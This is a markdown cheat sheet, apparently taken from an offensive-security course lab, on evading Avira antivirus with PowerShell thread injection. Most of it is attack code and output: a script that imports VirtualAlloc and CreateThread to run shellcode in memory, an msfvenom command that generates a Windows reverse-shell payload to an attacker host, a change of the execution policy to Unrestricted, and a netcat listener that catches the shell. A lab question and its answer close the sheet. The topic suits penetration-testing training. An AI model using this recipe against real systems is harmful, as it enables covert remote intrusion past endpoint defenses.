# Evading AV with Thread Injection

Searching for Protections Options in the Avira Menu
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Evading-AV-with-Thread-Injection-1.png)

Avira Control Center
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Evading-AV-with-Thread-Injection-2.png)

Avira Free Antivirus Quarantine Message
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Evading-AV-with-Thread-Injection-3.png)

In-memory payload injection script for PowerShell
>``` shell
>$code = '
>[DllImport("kernel32.dll")]
>public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
>
>[DllImport("kernel32.dll")]
>public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
>
>[DllImport("msvcrt.dll")]
>public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
>
><place shellcode here>
>```

Generating a PowerShell compatible payload using msfvenom
>``` shell
>kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection
>
># ========== Expected Result ==========
>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
>[-] No arch selected, selecting arch: x86 from the payload
>No encoder specified, outputting raw payload
>Payload size: 324 bytes
>Final size of psh-reflection file: 2960 bytes
>...
>function xf {
>        Param ($nfCl, $vf)
>        $uaQP = ([AppDomain]...
>...
># =====================================
>```

First attempt for in-memory injection script
>``` shell
>$code = '
>[DllImport("kernel32.dll")]
>public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
>
>[DllImport("kernel32.dll")]
>public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
>
>[DllImport("msvcrt.dll")]
>public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
>
>function xf {
>        Param ($nfCl, $vf)
>        $uaQP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
>
>        return $uaQP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), >($uaQP.GetMethod('GetModuleHandle')).Invoke($null, @($nfCl)))), $vf))
>}
>
>function xb {
>        Param (
>                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jGN_b,
>                [Parameter(Position = 1)] [Type] $hh = [Void]
>        )
>...
>```

VirusTotal results for in-memory injection in PowerShell
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Evading-AV-with-Thread-Injection-4.png)

Avira scan on our malicious PowerShell script
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Evading-AV-with-Thread-Injection-5.png)

Launching x86 powershell version
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Evading-AV-with-Thread-Injection-6.png)

Attempting to run the script and encountering the Execution Policies error
>``` shell
>PS C:\Users\offsec\Desktop> .\bypass.ps1
>
># ========== Expected Result ==========
>.\bypass.ps1 : File C:\Users\offsec\Desktop\bypass.ps1 cannot be loaded because running scripts is disabled on this
>system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
>At line:1 char:1
>+ .\bypass.ps1
>+ ~~~~~~~~~~~~
>    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
>    + FullyQualifiedErrorId : UnauthorizedAccess
># =====================================
>```

Changing the ExecutionPolicy for our current user
>``` shell
>PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
>
># ========== Expected Result ==========
>Undefined
># =====================================
>
>PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
>
># ========== Expected Result ==========
>Execution Policy Change
>The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
>you to the security risks described in the about_Execution_Policies help Module at
>https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
>[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
># =====================================
>
>PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
>
># ========== Expected Result ==========
>Unrestricted
># =====================================
>```

Setting up a netcat listener to interact with our reverse shell
>``` shell
>kali@kali:~$ nc -lvnp 443
>
># ========== Expected Result ==========
>listening on [any] 443 ...
># =====================================
>```

Running the PowerShell script
>``` shell
>PS C:\Users\offsec\Desktop> .\bypass.ps1
>
># ========== Expected Result ==========
>IsPublic IsSerial Name                                     BaseType
>-------- -------- ----                                     --------
>True     True     Byte[]                                   System.Array
>124059648
>124059649
>...
># =====================================
>```

Receiving a reverse shell on our attacking machine
>``` shell
>kali@kali:~$ nc -lvnp 443
>
># ========== Expected Result ==========
>listening on [any] 443 ...
>connect to [192.168.50.1] from (UNKNOWN) [192.168.50.62] 64613
>Microsoft Windows [Version 10.0.22000.675]
>(c) Microsoft Corporation. All rights reserved.
># =====================================
>
>C:\Users\offsec>whoami
>
># ========== Expected Result ==========
>whoami
>client01\offsec
># =====================================
>
>C:\Users\offsec>hostname
>
># ========== Expected Result ==========
>hostname
>client01
># =====================================
>```

Lab 1 -     Review the code from the PowerShell script and ensure that you have a basic understanding of how it works. Connect to the VM 1 and get a shell back to your Kali Linux machine using the memory injection PowerShell AV bypass technique we covered in this Learning Unit. As an additional exercise, attempt to get a reverse shell using a PowerShell one-liner rather than a script. Which API have we used in our script to allocate memory for the shellcode?
>VirtualAlloc
